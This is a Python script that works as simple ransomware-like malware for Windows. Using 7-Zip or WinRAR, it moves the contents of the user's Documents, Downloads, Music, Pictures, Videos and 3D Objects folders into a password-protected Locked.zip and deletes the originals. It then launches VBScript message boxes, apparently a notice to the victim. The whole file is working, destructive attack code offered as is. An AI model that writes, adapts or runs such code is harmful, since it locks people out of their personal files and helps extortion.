from box import *       # import from box.py python file
from os import *
from shutil import *
from getpass import *



username = getuser()    # find a user_name of the system


def is_program_installed(directory_path, executable_name):
    return path.exists(directory_path) or path.isfile(executable_name)


directory_path_to_check = r"C:\Program Files\7-Zip"
executable_name_to_check = r"C:\Program Files\7-Zip\7z.exe"

directory_path_to_check_2 = r"C:\Program Files\WinRAR"
executable_name_to_check_2 = r"C:\Program Files\WinRAR\Rar.exe"


if is_program_installed(directory_path_to_check, executable_name_to_check):     # To 7-zip
    def D3():
        chdir(f'C:\\Users\\{username}\\3D Objects')
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\7-Zip\7z.exe" a -tzip -pwhoami Locked.zip folder')       # create_password_protected_zip_in_7-zip,    Password is = whoami
        rmtree("folder")

    def DO():
        chdir(f"C:\\Users\\{username}\\Documents")
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\7-Zip\7z.exe" a -tzip -pwhoami Locked.zip folder')
        rmtree("folder")


    def D():
        chdir(f"C:\\Users\\{username}\\Downloads")
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\7-Zip\7z.exe" a -tzip -pwhoami Locked.zip folder')
        rmtree("folder")


    def M():
        chdir(f"C:\\Users\\{username}\\Music")
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\7-Zip\7z.exe" a -tzip -pwhoami Locked.zip folder')
        rmtree("folder")
        

    def P():
        chdir(f"C:\\Users\\{username}\\Pictures")
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\7-Zip\7z.exe" a -tzip -pwhoami Locked.zip folder')
        rmtree("folder")


    def V():
        chdir(f"C:\\Users\\{username}\\Videos")
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\7-Zip\7z.exe" a -tzip -pwhoami Locked.zip folder')
        rmtree("folder")




    D3()
    DO()
    D()
    M()
    P()
    V()

    box()       # create a message box, function in box.py file
    box2()
    box3()
    box4()

    system(f"C:\\Users\\{username}\\Videos\\box.vbs")       # run a message box
    system(f"C:\\Users\\{username}\\Videos\\box2.vbs")
    system(f"C:\\Users\\{username}\\Videos\\box3.vbs")
    system(f"C:\\Users\\{username}\\Videos\\box4.vbs")
    remove("box.vbs")       # delete a message box file
    remove("box2.vbs")
    remove("box3.vbs")
    remove("box4.vbs")

elif is_program_installed(directory_path_to_check_2, executable_name_to_check_2):      # To WinRAR
    def D32():
        chdir(f'C:\\Users\\{username}\\3D Objects')
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\WinRAR\Rar.exe" a -pwhoami Locked.zip folder')       # create_password_protected_zip_in_WinRAR,    Password is = whoami
        rmtree("folder")

    def DO2():
        chdir(f"C:\\Users\\{username}\\Documents")
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\WinRAR\Rar.exe" a -pwhoami Locked.zip folder')
        rmtree("folder")


    def D2():
        chdir(f"C:\\Users\\{username}\\Downloads")
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\WinRAR\Rar.exe" a -pwhoami Locked.zip folder')
        rmtree("folder")


    def M2():
        chdir(f"C:\\Users\\{username}\\Music")
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\WinRAR\Rar.exe" a -pwhoami Locked.zip folder')
        rmtree("folder")
        

    def P2():
        chdir(f"C:\\Users\\{username}\\Pictures")
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\WinRAR\Rar.exe" a -pwhoami Locked.zip folder')
        rmtree("folder")


    def V2():
        chdir(f"C:\\Users\\{username}\\Videos")
        mkdir("folder")
        ls = listdir()
        for x in ls:
            move(x, "folder")
        system(r'"C:\Program Files\WinRAR\Rar.exe" a -pwhoami Locked.zip folder')
        rmtree("folder")
    

    D32()
    DO2()
    D2()
    M2()
    P2()
    V2()

    box()     # create a message box, function in box.py file
    box2()
    box3()
    box4()

    system(f"C:\\Users\\{username}\\Videos\\box.vbs")        # run a message box
    system(f"C:\\Users\\{username}\\Videos\\box2.vbs")
    system(f"C:\\Users\\{username}\\Videos\\box3.vbs")
    system(f"C:\\Users\\{username}\\Videos\\box4.vbs")
    remove("box.vbs")       # delete a message box file
    remove("box2.vbs")
    remove("box3.vbs")
    remove("box4.vbs")


else:
    print(f"This system is not vulnerable !!!")